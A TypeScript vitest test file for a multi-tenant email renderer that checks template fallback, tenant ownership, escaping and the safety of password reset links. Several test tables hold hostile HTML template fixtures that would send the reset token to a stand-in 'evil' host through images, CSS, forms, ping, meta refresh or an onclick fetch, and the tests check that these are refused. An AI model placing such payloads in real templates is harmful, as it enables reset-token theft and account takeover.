import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../auth/email-templates', () => ({
  getAppEmailConfig: vi.fn(async () => ({
    appName: 'Seeclub',
    appDomain: 'app.example.org',
    from: '"Seeclub" <app@example.org>',
    replyTo: 'app@example.org',
    continueUrl: 'https://app.example.org/auth/login',
    contactEmail: 'info@example.org',
    passwordResetTemplate: '',
  })),
}));
vi.mock('../srv/sentry', () => ({ reportToSentry: vi.fn(async () => undefined) }));
vi.mock('firebase-functions/v2', () => ({ logger: { info: vi.fn(), error: vi.fn(), warn: vi.fn(), debug: vi.fn() } }));

import { logger } from 'firebase-functions/v2';
import { reportToSentry } from '../srv/sentry';
import { composeBody, EmailTemplateError, renderEmail, renderPasswordResetEmail, TemplateReader } from './render-email';
import type { StoredTemplate } from './render-email.logic';

interface Entry {
  doc?: StoredTemplate;
  version?: { html?: string; text?: string; subject?: string; status?: string };
}

/** Fake reader: `okey` is the published entry, `okey@N` an explicit version (preview). A version is published unless it says otherwise. */
function readerOf(entries: Record<string, Entry>): TemplateReader {
  return async (okey, version) => {
    const entry = (version !== undefined ? entries[`${okey}@${version}`] : undefined) ?? entries[okey];
    return { doc: entry?.doc, version: entry?.version && ({ status: 'published', ...entry.version } as never) };
  };
}

const layoutDoc = (tenant: string): StoredTemplate => ({ kind: 'emailLayout', tenants: [tenant], currentVersion: 1 });
const textDoc = (tenant: string, currentVersion = 1): StoredTemplate => ({ kind: 'emailText', tenants: [tenant], currentVersion });

const STANDARD = { html: '<div class="std">{{app_name}} {{{content}}}{{#if contact_email}} {{contact_email}}{{/if}} (c) {{year}}</div>', text: 'STD\n{{{content}}}\n{{#if contact_email}}{{contact_email}}{{/if}}' };
const PLAIN = { html: '<div class="plain">{{{content}}}</div>', text: 'PLAIN\n{{{content}}}' };
const RESET = { subject: 'Passwort fuer {{app_name}}', html: '<p><a href="{{url}}">Link</a></p>', text: 'Link: {{{url}}}' };
const SHARED_RESET = { subject: 'Shared {{app_name}}', html: '<p><a href="{{url}}">shared</a></p>', text: 'shared\n{{{url}}}' };

const base: Record<string, Entry> = {
  'email-layout_scs': { doc: layoutDoc('scs'), version: STANDARD },
  'email-layout-plain': { doc: layoutDoc('system'), version: PLAIN },
  'email-text-password-reset': { doc: textDoc('system'), version: SHARED_RESET },
};
const url = 'https://app.example.org/auth/confirm?mode=resetPassword&oobCode=abc';

beforeEach(() => vi.clearAllMocks());

describe('renderEmail', () => {
  it('prefers the published tenant copy over the shared text', async () => {
    const read = readerOf({ ...base, 'email-text-password-reset_scs': { doc: textDoc('scs'), version: RESET } });
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset', variables: { url } }, read);
    expect(mail.subject).toBe('Passwort fuer Seeclub');
    expect(mail.html).toContain('class="std"');
    expect(mail.html).toContain('Link</a>');
  });

  it('uses the shared text while the tenant copy is a draft', async () => {
    const read = readerOf({ ...base, 'email-text-password-reset_scs': { doc: textDoc('scs', 0), version: RESET } });
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset', variables: { url } }, read);
    expect(mail.subject).toBe('Shared Seeclub');
  });

  it('skips a tenant copy whose current version is not published', async () => {
    const draftText = { doc: textDoc('scs', 2), version: { ...RESET, status: 'draft' } };
    const read = readerOf({ ...base, 'email-text-password-reset_scs': draftText });
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset', variables: { url } }, read);
    expect(mail.subject).toBe('Shared Seeclub');
  });

  it('never wraps a mail in a layout whose current version is not published', async () => {
    const read = readerOf({ ...base, 'email-layout_scs': { doc: layoutDoc('scs'), version: { ...STANDARD, status: 'draft' } } });
    expect((await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>' }, read)).html).toContain('class="plain"');
  });

  it('reads a version without a status as not published', async () => {
    const read: TemplateReader = async (okey) => ({ doc: layoutDoc('system'), version: okey === 'email-layout-plain' ? ({ ...PLAIN, status: undefined } as never) : undefined });
    await expect(renderEmail({ tenantId: 'scs', layout: 'plain', body: '<p>x</p>' }, read)).rejects.toMatchObject({ code: 'no-layout' });
  });

  it('compiles text and subject raw and html escaped', async () => {
    const read = readerOf(base);
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset', variables: { url } }, read);
    expect(mail.text).toContain(`shared\n${url}`);
    expect(mail.html).toContain('oobCode&#x3D;abc');
    expect(mail.html).not.toContain(url);
  });

  it('adds the shared variables and lets a caller variable not override them', async () => {
    const read = readerOf(base);
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>', variables: { app_name: 'Spoof' } }, read);
    expect(mail.html).toContain('Seeclub');
    expect(mail.html).not.toContain('Spoof');
    expect(mail.html).toContain(`(c) ${new Date().getFullYear()}`);
  });

  it('gives the layout the shared variables and the content, never a caller variable', async () => {
    const nosy = { html: '[{{url}}|{{email}}|{{login_id}}]{{app_name}}{{{content}}}', text: '[{{url}}|{{email}}|{{login_id}}]{{{content}}}' };
    const read = readerOf({ ...base, 'email-layout_scs': { doc: layoutDoc('scs'), version: nosy } });
    const variables = { url: 'https://a.ch/secret', email: 'x@example.org', login_id: 'anna' };
    for (const req of [{ textKey: 'email-text-password-reset' }, { body: '<p>x</p>' }]) {
      const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', variables, ...req }, read);
      expect(mail.html).toContain('[||]Seeclub');
      expect(mail.text).toContain('[||]');
    }
  });

  it('wraps a body in the standard layout and derives the text half', async () => {
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>Hallo <a href="https://a.ch/x?a=1&amp;b=2">Welt</a></p>' }, readerOf(base));
    expect(mail.subject).toBe('');
    expect(mail.html).toContain('<div class="std">Seeclub <p>Hallo <a href="https://a.ch/x?a=1&amp;b=2">Welt</a></p>');
    expect(mail.text).toBe('STD\nHallo Welt (https://a.ch/x?a=1&b=2)\n');
  });

  it('falls to plain when the tenant has no standard layout', async () => {
    const mail = await renderEmail({ tenantId: 'p13', layout: 'standard', body: '<p>x</p>' }, readerOf(base));
    expect(mail.html).toContain('class="plain"');
    expect(mail.text.startsWith('PLAIN')).toBe(true);
  });

  it('throws EmailTemplateError with noPlainFallback and no standard layout', async () => {
    await expect(
      renderEmail({ tenantId: 'p13', layout: 'standard', textKey: 'email-text-password-reset', noPlainFallback: true }, readerOf(base))
    ).rejects.toMatchObject({ name: 'EmailTemplateError', code: 'no-standard-layout' });
  });

  it('throws EmailTemplateError when no text template is usable', async () => {
    await expect(renderEmail({ tenantId: 'scs', layout: 'standard', textKey: 'email-text-gone' }, readerOf(base))).rejects.toBeInstanceOf(EmailTemplateError);
  });

  it('throws EmailTemplateError when a layout has no content slot', async () => {
    const noSlotHtml = readerOf({ ...base, 'email-layout_scs': { doc: layoutDoc('scs'), version: { html: '<p>none</p>', text: '{{{content}}}' } } });
    const noSlotText = readerOf({ ...base, 'email-layout_scs': { doc: layoutDoc('scs'), version: { html: '{{{content}}}', text: 'none' } } });
    for (const read of [noSlotHtml, noSlotText]) {
      await expect(renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>' }, read)).rejects.toMatchObject({ code: 'layout-without-content' });
    }
  });

  it('passes contact_email only with includeContact', async () => {
    const read = readerOf(base);
    const without = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>' }, read);
    const withContact = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>', includeContact: true }, read);
    expect(without.html).not.toContain('info@example.org');
    expect(withContact.html).toContain('info@example.org');
    expect(withContact.text).toContain('info@example.org');
  });

  it('appends the attachment note with the filename escaped', async () => {
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>', attachmentName: 'a<b.pdf' }, readerOf(base));
    expect(mail.html).toContain('📎 Beilage: <strong>a&lt;b.pdf</strong>');
    expect(mail.html).not.toContain('a<b.pdf');
    expect(mail.text).toContain('📎 Beilage: a<b.pdf');
  });

  it('renders a draft only through previewVersion', async () => {
    const entries = {
      ...base,
      'email-text-password-reset_scs': { doc: textDoc('scs', 0), version: undefined },
      'email-text-password-reset_scs@3': { doc: textDoc('scs', 0), version: { subject: 'Draft {{app_name}}', html: '<p>draft</p>', text: 'draft', status: 'draft' } },
    };
    const read = readerOf(entries);
    const live = await renderEmail({ tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset' }, read);
    expect(live.subject).toBe('Shared Seeclub');
    const preview = await renderEmail(
      { tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset', previewVersion: { okey: 'email-text-password-reset_scs', version: 3 } },
      read
    );
    expect(preview.subject).toBe('Draft Seeclub');
    expect(preview.html).toContain('<p>draft</p>');
  });

  it('replaces the layout when the previewed version is a layout, even a draft one', async () => {
    const read = readerOf({
      ...base,
      'email-layout_scs@2': { doc: { ...layoutDoc('scs'), currentVersion: 0 }, version: { html: '<b>new</b>{{{content}}}', text: 'NEW {{{content}}}', status: 'draft' } },
    });
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>', previewVersion: { okey: 'email-layout_scs', version: 2 } }, read);
    expect(mail.html).toBe('<b>new</b><p>x</p>');
    expect(mail.text).toBe('NEW x');
  });
});

describe('template ownership', () => {
  const text = (subject: string, tenants: string[]) => ({ doc: { kind: 'emailText', tenants, currentVersion: 1 } as StoredTemplate, version: { subject, html: '<p>x</p>', text: 'x' } });
  const layout = (tenants: string[]) => ({ doc: { kind: 'emailLayout', tenants, currentVersion: 1 } as StoredTemplate, version: { html: '<i>planted</i>{{{content}}}', text: 'PLANTED {{{content}}}' } });
  const reset = { tenantId: 'scs', layout: 'standard', textKey: 'email-text-password-reset' } as const;

  it('ignores a fork key another tenant planted with a mixed tenants array', async () => {
    const read = readerOf({ ...base, 'email-text-password-reset_scs': text('Planted', ['p13', 'scs']) });
    expect((await renderEmail(reset, read)).subject).toBe('Shared Seeclub');
  });

  it('ignores a base key that names a tenant next to system', async () => {
    const read = readerOf({ 'email-layout_scs': base['email-layout_scs'], 'email-text-password-reset': text('Planted', ['p13', 'system']) });
    await expect(renderEmail(reset, read)).rejects.toMatchObject({ code: 'no-text' });
  });

  it('ignores a planted plain layout on the base key', async () => {
    const read = readerOf({ 'email-layout-plain': layout(['p13', 'system']) });
    await expect(renderEmail({ tenantId: 'scs', layout: 'plain', body: '<p>x</p>' }, read)).rejects.toMatchObject({ code: 'no-layout' });
  });

  it('never reads the base key of the standard layout', async () => {
    const reads: string[] = [];
    const entries = { ...base, 'email-layout_scs': { doc: undefined }, 'email-layout': layout(['system']) };
    const read: TemplateReader = (okey, version) => {
      reads.push(okey);
      return readerOf(entries)(okey, version);
    };
    const mail = await renderEmail({ tenantId: 'scs', layout: 'standard', body: '<p>x</p>' }, read);
    expect(mail.html).toContain('class="plain"');
    expect(reads).not.toContain('email-layout');
  });

  it('refuses a reset through a planted email-layout doc, whatever its tenants say', async () => {
    const planted = readerOf({ 'email-layout': layout(['scs', 'system']), 'email-text-password-reset': base['email-text-password-reset'] });
    await expect(
      renderEmail({ ...reset, tenantId: 'scs', noPlainFallback: true }, planted)
    ).rejects.toMatchObject({ code: 'no-standard-layout' });
  });
});

describe('renderPasswordResetEmail', () => {
  const vars = { url, email: 'x@example.org', app_name: 'Seeclub', login_id: '' };

  const resetText = (version: Entry['version']) => readerOf({ ...base, 'email-text-password-reset': { doc: textDoc('system'), version } });

  it('renders the reset mail through the standard layout', async () => {
    const mail = await renderPasswordResetEmail('scs', vars, readerOf(base));
    expect(mail?.subject).toBe('Shared Seeclub');
    expect(mail?.text).toContain(url);
    expect(mail?.html).toContain('<a href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc">shared</a>');
  });

  it('places the link into the seeded templates and keeps logo, band, button and footer', async () => {
    const dir = resolve(__dirname, '../../../../scripts/email-templates');
    const source = (name: string) => readFileSync(resolve(dir, name), 'utf8')
      .replaceAll('%%HEADER_LINK%%', 'https://www.example.org')
      .replaceAll('%%LOGO_URL%%', 'https://images.example.org/email-header.png')
      .replaceAll('%%LOGO_ALT%%', 'Seeclub')
      .replaceAll('%%LOGO_WIDTH%%', '209')
      .replaceAll('%%FOOTER_NAME%%', 'Seeclub')
      .replaceAll('%%BAND_COLOR%%', '#009d53');
    const read = readerOf({
      'email-layout_scs': { doc: layoutDoc('scs'), version: { html: source('layout-standard.html'), text: source('layout-standard.txt') } },
      'email-text-password-reset': { doc: textDoc('system'), version: { html: source('text-password-reset.html'), text: source('text-password-reset.txt'), subject: source('text-password-reset.subject.txt') } },
    });
    const mail = await renderPasswordResetEmail('scs', { ...vars, login_id: 'anna' }, read);
    const html = mail?.html ?? '';
    expect(html.startsWith('<!DOCTYPE html><html lang="de">')).toBe(true);
    expect(html.match(/<html/g)).toHaveLength(1);
    expect(html).toContain('<a href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc" target="_blank"');
    expect(html).toContain('Passwort setzen');
    expect(html).toContain('background:#009d53');
    expect(html).toContain('background:#2c6ee0');
    expect(html).not.toContain('%%');
    expect(html).toContain('<a href="https://www.example.org" target="_blank">');
    expect(html).toContain('<img src="https://images.example.org/email-header.png" alt="Seeclub" width="209"');
    expect(html).toContain(`© ${new Date().getFullYear()} Seeclub`);
    expect(html).toContain('<strong>anna</strong>');
    expect(html).toContain('<p style="margin:0">Hallo,</p>');
    expect(html).not.toMatch(/<style|<!--|<title/);
    expect(mail?.text).toContain(url);
  });

  it('never hands the link to a template: a character lookup reads the token', async () => {
    const read = resetText({ subject: 's', html: '<a href="{{{url}}}">x</a><i>{{lookup url 0}}{{lookup url 1}}{{lookup url 2}}{{lookup url 3}}</i>', text: '{{{url}}}\n<{{url.[0]}}{{url.[1]}}{{url.[2]}}{{url.[3]}}>' });
    const mail = await renderPasswordResetEmail('scs', vars, read);
    expect(mail?.html).toContain('<i>okr-</i>');
    expect(mail?.text).toContain('<okr->');
  });

  it('leaves no token in the mail the recipient gets', async () => {
    const mail = await renderPasswordResetEmail('scs', vars, resetText({ subject: 's', html: '<a href="{{{url}}}">x</a>', text: '{{{url}}}' }));
    expect(mail).toBeDefined();
    expect(`${mail?.html}${mail?.text}`).not.toContain('okr-reset-');
  });

  const good = '<a href="{{{url}}}">Link</a>';

  it.each([
    ['an image', '<img src="{{{url}}}">'],
    ['an image next to the link', `<img src="{{{url}}}">${good}`],
    ['a longer url', '<a href="https://evil/?l={{{url}}}">x</a>'],
    ['a longer url next to the link', `<a href="https://evil/?l={{{url}}}">x</a>${good}`],
    ['a dropped attribute only', '<a data-x="{{{url}}}" href="https://a.ch">x</a>'],
    ['a kept attribute next to the link', `<a title="{{{url}}}" href="https://a.ch">x</a>${good}`],
    ['a style attribute next to the link', `<p style="background:url(https://evil/{{{url}}})">x</p>${good}`],
    ['a style block only', '<style>a { background: url(https://evil/{{{url}}}); }</style>'],
    ['a comment only', '<!-- {{{url}}} -->'],
    ['visible text', `${good}<p>{{{url}}}</p>`],
    ['visible text, escaped braces', `${good} {{url}}`],
    ['no token at all', '<p>no link</p>'],
    ['an unterminated image before the link', `<img src="https://evil/?${good}`],
    ['a conditional comment around the link', `<!--[if mso]>${good}<![endif]-->`],
    ['a noscript around the link', `<noscript>${good}</noscript>`],
    ['a textarea only', '<form action="https://evil/"><textarea>{{{url}}}</textarea></form>'],
  ])('refuses the token in %s', async (_, html) => {
    await expect(renderPasswordResetEmail('scs', vars, resetText({ subject: 's', html, text: '{{{url}}}' }))).resolves.toBeUndefined();
    expect(logger.error).toHaveBeenCalledTimes(1);
    expect(reportToSentry).toHaveBeenCalledTimes(1);
  });

  it.each([
    ['the subject', '<a href="{{{url}}}">x</a>', '{{{url}}}', 'Link {{{url}}}'],
    ['a text half without it', '<a href="{{{url}}}">x</a>', 'no link', 's'],
    ['a longer url in the text half', '<a href="{{{url}}}">x</a>', 'https://evil/?l={{{url}}}', 's'],
    ['a url and a byte order mark in the text half', '<a href="{{{url}}}">x</a>', 'https://evil.example/?l=\ufeff{{{url}}}', 's'],
  ])('refuses %s', async (_, html, text, subject) => {
    await expect(renderPasswordResetEmail('scs', vars, resetText({ subject, html, text }))).resolves.toBeUndefined();
  });

  it.each([
    ['CDATA', `<![CDATA[${good}]]>${good}`],
    ['a conditional comment', `<!--[if mso]><a href="https://evil/">x</a><![endif]-->${good}`],
    ['a comment closed with --!>', `<!-- x --!>${good}<!-- y -->${good}`],
    ['a comment holding the token', `<!-- {{{url}}} -->${good}`],
    ['noscript', `<noscript><img src="https://evil/?{{{url}}}"></noscript>${good}`],
    ['svg', `<svg><image href="https://evil/x.png" /><a href="{{{url}}}">x</a></svg>${good}`],
    ['math', `<math><a href="{{{url}}}">x</a></math>${good}`],
    ['onclick', `<a href="{{{url}}}" onclick="fetch('https://evil/?'+this.href)">x</a>`],
    ['onmouseover on a parent', `<div onmouseover="location='https://evil/'">${good}</div>`],
    ['ping', '<a href="{{{url}}}" ping="https://evil/">x</a>'],
    ['a style block reading the href', `<style>a[href^="https://a"] { background: url(https://evil/a); }</style>${good}`],
    ['base', `<base href="https://evil/">${good}`],
    ['a form with a textarea', `<form action="https://evil/"><textarea>{{{url}}}</textarea>${good}</form>`],
    ['a meta refresh', `<meta http-equiv="refresh" content="0;url=https://evil/">${good}`],
    ['a link stylesheet', `<link rel="stylesheet" href="https://evil/x.css">${good}`],
  ])('leaves nothing harmful beside the link: %s', async (_, html) => {
    const mail = await renderPasswordResetEmail('scs', vars, resetText({ subject: 's', html, text: '{{{url}}}' }));
    if (!mail) return;
    expect(mail.html).not.toMatch(/evil|\son\w+=|ping=|<style|<base|<form|<textarea|<svg|<math|<noscript|<meta http-equiv|<link/);
    const hrefs = mail.html.split('href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc"').length - 1;
    expect(hrefs).toBeGreaterThan(0);
    expect(mail.html.split('oobCode').length - 1).toBe(hrefs);
    expect(mail.html).not.toContain('okr-reset-');
  });

  it('falls to the next source when a layout copies the content into an attribute', async () => {
    const layout = { html: '<a title="{{content}}" href="https://a.ch">x</a>{{{content}}}', text: '{{{content}}}' };
    const read = readerOf({ ...base, 'email-layout_scs': { doc: layoutDoc('scs'), version: layout } });
    await expect(renderPasswordResetEmail('scs', vars, read)).resolves.toBeUndefined();
  });

  it('returns undefined from renderPasswordResetEmail on a broken template and never throws', async () => {
    const broken = readerOf({ ...base, 'email-text-password-reset': { doc: textDoc('system'), version: { subject: 's', html: '{{#if}}', text: 'x' } } });
    await expect(renderPasswordResetEmail('scs', vars, broken)).resolves.toBeUndefined();
    const throwing: TemplateReader = async () => {
      throw new Error('firestore down');
    };
    await expect(renderPasswordResetEmail('scs', vars, throwing)).resolves.toBeUndefined();
    expect(logger.error).toHaveBeenCalledTimes(2);
    expect(reportToSentry).toHaveBeenCalledTimes(2);
  });

  it('is quiet about a missing standard layout, which is normal during migration', async () => {
    await expect(renderPasswordResetEmail('p13', vars, readerOf(base))).resolves.toBeUndefined();
    expect(logger.info).toHaveBeenCalledTimes(1);
    expect(logger.error).not.toHaveBeenCalled();
    expect(reportToSentry).not.toHaveBeenCalled();
  });

  it('returns undefined when the rendered mail lacks the link', async () => {
    const noLink = readerOf({ ...base, 'email-text-password-reset': { doc: textDoc('system'), version: { subject: 's', html: '<p>no link</p>', text: 'no link' } } });
    await expect(renderPasswordResetEmail('scs', vars, noLink)).resolves.toBeUndefined();
    expect(logger.error).toHaveBeenCalledTimes(1);
    expect(reportToSentry).toHaveBeenCalledTimes(1);
  });

  it('returns undefined when the subject is missing or renders empty', async () => {
    const withSubject = (subject: string | undefined) =>
      readerOf({ ...base, 'email-text-password-reset': { doc: textDoc('system'), version: { subject, html: '<a href="{{url}}">x</a>', text: '{{{url}}}' } } });
    await expect(renderPasswordResetEmail('scs', vars, withSubject(undefined))).resolves.toBeUndefined();
    await expect(renderPasswordResetEmail('scs', vars, withSubject('{{#if login_id}}Konto {{login_id}}{{/if}}'))).resolves.toBeUndefined();
    await expect(renderPasswordResetEmail('scs', vars, withSubject('  \n'))).resolves.toBeUndefined();
    expect(logger.error).toHaveBeenCalledTimes(3);
    expect(reportToSentry).toHaveBeenCalledTimes(3);
  });

  it('trims a subject with a trailing newline', async () => {
    const read = readerOf({ ...base, 'email-text-password-reset': { doc: textDoc('system'), version: { subject: 'Passwort zuruecksetzen\n', html: '<a href="{{url}}">x</a>', text: '{{{url}}}' } } });
    const mail = await renderPasswordResetEmail('scs', vars, read);
    expect(mail?.subject).toBe('Passwort zuruecksetzen');
  });

  it('collapses line breaks and doubled spaces inside the subject', async () => {
    const read = resetText({ subject: '  Passwort  neu\n  setzen\n', html: '<a href="{{{url}}}">x</a>', text: '{{{url}}}' });
    expect((await renderPasswordResetEmail('scs', vars, read))?.subject).toBe('Passwort neu setzen');
  });

  it('keeps the log helper from printing the recipient, in the text template and in the layout', async () => {
    const info = vi.spyOn(console, 'info').mockImplementation(() => undefined);
    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined);
    const layout = { html: '{{log this}}{{{content}}}', text: '{{log this}}{{{content}}}' };
    const read = readerOf({
      ...base,
      'email-layout_scs': { doc: layoutDoc('scs'), version: layout },
      'email-text-password-reset': { doc: textDoc('system'), version: { subject: '{{log this}}s', html: '{{log email}}<a href="{{{url}}}">x</a>', text: '{{log this}}\n{{{url}}}' } },
    });
    const mail = await renderPasswordResetEmail('scs', vars, read);
    expect(mail?.subject).toBe('s');
    expect(info).not.toHaveBeenCalled();
    expect(log).not.toHaveBeenCalled();
    info.mockRestore();
    log.mockRestore();
  });

  it('never logs the link or the address', async () => {
    const noLink = readerOf({ ...base, 'email-text-password-reset': { doc: textDoc('system'), version: { subject: 's', html: 'x', text: 'x' } } });
    await renderPasswordResetEmail('scs', vars, noLink);
    const logged = JSON.stringify([(logger.error as ReturnType<typeof vi.fn>).mock.calls, (reportToSentry as ReturnType<typeof vi.fn>).mock.calls]);
    expect(logged).not.toContain('oobCode');
    expect(logged).not.toContain('x@example.org');
  });
});

describe('composeBody', () => {
  it('sanitises the body, wraps it in the standard layout and passes the contact address', async () => {
    const mail = await composeBody('scs', { body: '<p>Hallo</p><script>x()</script><a href="http://a.ch">l</a>' }, readerOf(base));
    expect(mail.html).toContain('class="std"');
    expect(mail.html).toContain('<p style="margin:0 0 16px">Hallo</p>');
    expect(mail.html).toContain('href="http://a.ch"');
    expect(mail.html).not.toContain('<script');
    expect(mail.html).toContain('info@example.org');
    expect(mail.text).toContain('Hallo');
  });

  it('uses the plain layout when asked', async () => {
    const mail = await composeBody('scs', { body: '<p>x</p>', layout: 'plain' }, readerOf(base));
    expect(mail.html).toContain('class="plain"');
    expect(mail.html).not.toContain('info@example.org');
  });

  it('appends the attachment note', async () => {
    const mail = await composeBody('scs', { body: '<p>x</p>', attachmentName: 'R1.pdf' }, readerOf(base));
    expect(mail.html).toContain('<strong>R1.pdf</strong>');
  });

  it('trims the attachment name and drops a blank or non-text one', async () => {
    const mail = await composeBody('scs', { body: '<p>x</p>', attachmentName: '  R1.pdf ' }, readerOf(base));
    expect(mail.html).toContain('<strong>R1.pdf</strong>');
    for (const attachmentName of ['   ', 5, null, undefined]) {
      expect((await composeBody('scs', { body: '<p>x</p>', attachmentName }, readerOf(base))).html).not.toContain('Beilage');
    }
  });

  it('throws when no layout is usable', async () => {
    await expect(composeBody('scs', { body: '<p>x</p>' }, readerOf({}))).rejects.toBeInstanceOf(EmailTemplateError);
  });

  it.each([
    ['an empty paragraph', '<p></p>'],
    ['a blank paragraph', '<p>&nbsp;</p><p> </p>'],
    ['only breaks', '<p><br></p>'],
    ['only what the sanitiser drops', '<script>x()</script><style>p{}</style>'],
    ['nothing', ''],
  ])('refuses a body without content: %s', async (_, body) => {
    await expect(composeBody('scs', { body }, readerOf(base))).rejects.toMatchObject({ code: 'no-content' });
  });

  it('accepts an empty body when an attachment gives the mail content', async () => {
    const mail = await composeBody('scs', { body: '<p></p>', attachmentName: 'R1.pdf' }, readerOf(base));
    expect(mail.html).toContain('<strong>R1.pdf</strong>');
    expect(mail.text).toBe('STD\n📎 Beilage: R1.pdf\ninfo@example.org');
  });

  it('refuses an empty body when the attachment name is blank or not text', async () => {
    for (const attachmentName of ['   ', 5, null]) {
      await expect(composeBody('scs', { body: '<p></p>', attachmentName }, readerOf(base))).rejects.toMatchObject({ code: 'no-content' });
    }
  });

  it('accepts a body that is only an image', async () => {
    const mail = await composeBody('scs', { body: '<p><img src="https://a.ch/a.png"></p>' }, readerOf(base));
    expect(mail.html).toContain('<img src="https://a.ch/a.png"');
  });

  it('refuses an image the sanitiser left without a source', async () => {
    await expect(composeBody('scs', { body: '<img src="http://a.ch/a.png">' }, readerOf(base))).rejects.toMatchObject({ code: 'no-content' });
  });
});
